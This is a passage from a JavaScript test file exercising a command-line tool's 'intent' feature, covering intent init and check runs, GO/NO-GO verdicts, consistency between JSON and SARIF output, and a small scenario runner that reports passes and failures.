    commitAll(coldRepo, "chore: cold base");

    const coldInit = spawnSync(
      process.execPath,
      [
        coldBin,
        "intent",
        "init",
        "--goal",
        "Cold path task",
        "--allow",
        "src/**",
      ],
      { cwd: coldRepo, encoding: "utf8", env: buildEnv(), timeout: 60_000 },
    );
    assert.equal(coldInit.status, 0, `cold init\n${coldInit.stderr}\n${coldInit.stdout}`);
    commitAll(coldRepo, "chore: cold intent");
    write(coldRepo, "src/x.js", "export const x = 1;\n");
    const coldCheck = spawnSync(process.execPath, [coldBin, "intent", "check", "--json"], {
      cwd: coldRepo,
      encoding: "utf8",
      env: buildEnv(),
      timeout: 60_000,
    });
    assert.equal(coldCheck.status, 0, `cold check\n${coldCheck.stderr}\n${coldCheck.stdout}`);
    const coldDoc = JSON.parse(coldCheck.stdout);
    assert.equal(coldDoc.verdict, "GO");
  } finally {
    cleanup(base);
  }
});

scenario("intent: help surfaces and main check JSON/SARIF stay consistent", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const h = run(["help", "intent"], repo);
    assert.equal(h.code, 0);
    assert.match(h.stdout + h.stderr, /intent init/i);
    assert.match(h.stdout + h.stderr, /semantic correctness not proven/i);

    commitIntent(repo, INTENT_BASE);
    write(repo, "src/other/bad.js", "export const bad = 1;\n");
    const sarifPath = path.join(repo, "out.sarif");
    const r = run(
      ["check", "--json", "--no-overview", "--no-brief-check", "--sarif", sarifPath],
      repo,
    );
    // Overall may be NO-GO (dirty + intent)
    const doc = parseJson(r);
    const ic = (doc.checks || []).find((c) => /Intent Contract/i.test(c.label));
    assert.ok(ic && ic.status === "fail");
    assert.ok(existsSync(sarifPath), "SARIF written");
    const sarif = JSON.parse(readFileSync(sarifPath, "utf8"));
    const results = (((sarif.runs || [])[0] || {}).results) || [];
    const intentHit = results.some(
      (x) =>
        /intent/i.test(JSON.stringify(x)) ||
        /Intent Contract/i.test(JSON.stringify(x)),
    );
    assert.ok(intentHit, "SARIF should include Intent Contract finding");
    assert.ok(!JSON.stringify(sarif).includes("export const bad"), "SARIF no file body");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// runner
// ---------------------------------------------------------------------------
let failed = 0;
for (const s of scenarios) {
  const t0 = Date.now();
  try {
    await s.fn();
    console.log(`  PASS  ${s.name}  (${((Date.now() - t0) / 1000).toFixed(1)}s)`);
  } catch (e) {
    failed++;
    console.error(`  FAIL  ${s.name}  (${((Date.now() - t0) / 1000).toFixed(1)}s)`);
    console.error(String(e && e.stack ? e.stack : e).split("\n").map((l) => `        ${l}`).join("\n"));
  }
}
console.log("");
console.log(`  ${scenarios.length - failed}/${scenarios.length} scenarios passed${failed ? ` — ${failed} FAILED` : ""}`);
process.exit(failed ? 1 : 0);
